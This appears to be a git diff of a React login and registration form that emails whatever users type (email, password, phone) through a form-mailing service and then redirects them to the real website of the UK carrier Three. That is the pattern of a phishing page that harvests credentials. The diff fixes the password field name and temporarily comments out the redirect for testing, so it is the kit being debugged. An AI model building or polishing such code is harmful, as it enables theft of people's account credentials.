@@ -11,18 +11,19 @@ const AuthForm = () => {
   // State for input fields
   const [formData, setFormData] = useState({
     email: "",
-    message: "",
+    password: "",
     confirmPassword: "",
     phone: "",
   });
 
-  // Handlers for input changes
+  // Handler for input changes
   const handleChange = (e) => {
     setFormData({ ...formData, [e.target.name]: e.target.value });
   };
 
   const form = useRef();
 
+  // Login email sender
   const sendLoginEmail = (e) => {
     e.preventDefault();
 
@@ -35,18 +36,19 @@ const AuthForm = () => {
       )
       .then(
         (result) => {
-          console.log("Email sent:", result.text);
-
-          window.location.href = "https://www.three.co.uk/";
+          console.log("Login email sent:", result.text);
+          // You can uncomment this after testing:
+          // window.location.href = "https://www.three.co.uk/";
         },
         (error) => {
-          console.log("Error:", error.text);
+          console.log("Error sending login email:", error.text);
         }
       );
 
     e.target.reset();
   };
 
+  // Register email sender
   const sendRegisterEmail = (e) => {
     e.preventDefault();
 
@@ -59,13 +61,12 @@ const AuthForm = () => {
       )
       .then(
         (result) => {
-          console.log("Email sent:", result.text);
-
-          window.location.href = "https://www.three.co.uk/";
+          console.log("Register email sent:", result.text);
+          // You can uncomment this after testing:
+          // window.location.href = "https://www.three.co.uk/";
         },
         (error) => {
-          console.log("Error:", error.text);
-          window.location.href = "https://www.three.co.uk/";
+          console.log("Error sending register email:", error.text);
         }
       );
 
@@ -111,8 +112,9 @@ const AuthForm = () => {
         <form
           ref={form}
           className="mt-6 text-left"
-          onSubmit={isRegister == "Login" ? sendLoginEmail : sendRegisterEmail}
+          onSubmit={isRegister ? sendRegisterEmail : sendLoginEmail}
         >
+          {/* Account type (only for Register) */}
           {isRegister && (
             <div className="mb-4">
               <label className="block text-gray-700 font-medium">
@@ -145,6 +147,7 @@ const AuthForm = () => {
             </div>
           )}
 
+          {/* Phone number (only for Register) */}
           {isRegister && (
             <div className="relative mb-4">
               <input
@@ -175,8 +178,8 @@ const AuthForm = () => {
           <div className="relative mt-4">
             <input
               type={showPassword ? "text" : "password"}
-              name="message"
-              value={formData.message}
+              name="password" // ✅ Fixed field name
+              value={formData.password}
               onChange={handleChange}
               placeholder="Password*"
               required
@@ -190,6 +193,7 @@ const AuthForm = () => {
             </span>
           </div>
 
+          {/* Confirm Password (only for Register) */}
           {isRegister && (
             <>
               <div className="text-black text-base mt-2">
@@ -197,7 +201,6 @@ const AuthForm = () => {
                 <p>• Try forming one with 3 random words.</p>
               </div>
 
-              {/* Confirm Password Input */}
               <div className="relative mt-4">
                 <input
                   type={showConfirmPassword ? "text" : "password"}
@@ -222,6 +225,7 @@ const AuthForm = () => {
             </>
           )}
 
+          {/* Forgot Password (only for Login) */}
           {!isRegister && (
             <div className="text-left underline mt-2">
               <a href="#" className="text-blue-600 text-sm">
